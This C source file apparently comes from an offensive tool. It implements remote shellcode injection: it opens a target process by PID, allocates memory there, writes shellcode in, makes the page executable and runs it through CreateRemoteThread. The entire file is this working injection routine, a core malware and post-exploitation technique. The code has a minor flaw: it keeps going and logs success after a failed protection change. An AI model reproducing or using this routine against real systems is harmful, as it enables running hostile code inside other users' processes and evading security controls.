
#include "ProcessInjection.h"
#include "Process.h"
#include "Global.h"

bool inject_shellcode_process_pid(int pid, unsigned char* shellcode, int shellcodeLength) {
	bool returnValue = true;
	void* writeAddress = NULL;
	DWORD previousProtectionOptions;

	PRINT_DEBUG("Injecting into PID: %d\n", pid);
	HANDLE hProcToInject = process_open(pid, PROCESS_ALL_ACCESS);
	if (!hProcToInject) {
		PRINT_DEBUG("Failed to gain access to the process.\n");
		returnValue = false;
		goto exit;
	}

	PRINT_DEBUG("Successfully opened process, getting ready to inject...\n");
	writeAddress = VirtualAllocEx(hProcToInject,
		NULL,
		shellcodeLength,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (!writeAddress) {
		PRINT_DEBUG("Failed to acquire a remote write address.\n");
		returnValue = false;
		goto exit;
	}

	PRINT_DEBUG("Remote Buffer: %p\n", writeAddress);
	if (!WriteProcessMemory(hProcToInject, writeAddress, shellcode, shellcodeLength, NULL)) {
		PRINT_DEBUG("Failed writing to remote buffer.\n");
		returnValue = false;
		goto exit;
	}

	PRINT_DEBUG("Successfully written to remote buffer.\n");
	previousProtectionOptions = 0L;

	if (!VirtualProtectEx(hProcToInject,
		writeAddress,
		shellcodeLength,
		PAGE_EXECUTE_READ,
		&previousProtectionOptions)) {

		PRINT_DEBUG("Could not reset page to READ | EXEC.\n");
		returnValue = false;
	}

	PRINT_DEBUG("Successfully reset page to READ | EXEC.\n");
	if (!CreateRemoteThread(hProcToInject,
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)writeAddress, 
		NULL,
		0,
		NULL)) {
		
		PRINT_DEBUG("Could not start remote thread...\n");
		returnValue = false;
		goto exit;
	}

	PRINT_DEBUG("Remote thread successful!\n");

	exit:

	if(hProcToInject)
		CloseHandle(hProcToInject);

	return returnValue;
}